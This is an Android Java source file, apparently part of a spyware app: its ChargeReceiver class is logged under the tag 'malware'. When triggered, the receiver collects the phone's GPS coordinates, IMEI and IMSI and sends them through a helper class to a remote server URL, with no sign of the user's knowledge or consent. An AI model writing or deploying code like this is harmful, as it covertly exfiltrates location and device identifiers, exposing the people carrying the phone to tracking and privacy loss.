package ommrepublic.com.ledieo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Created by admin on 9/23/15.
 */
public class ChargeReceiver extends BroadcastReceiver{

    @Override
    public void onReceive(Context context, Intent intent)
    {
        // TODO -- Change the URL to server
        Log.d("malware", "Sending data");

        try {
            DeviceLocation d = new DeviceLocation();
            double[] location = d.getGPS(context);

            WebHelper w = new WebHelper(context.getString(R.string.user_info_api), PhoneInfo.getMyIMEI(context), PhoneInfo.getMyIMSI(context), location[0], location[1]);
            w.start();
        }
        catch(Exception e)
        {
            e.printStackTrace();
        }
    }
}
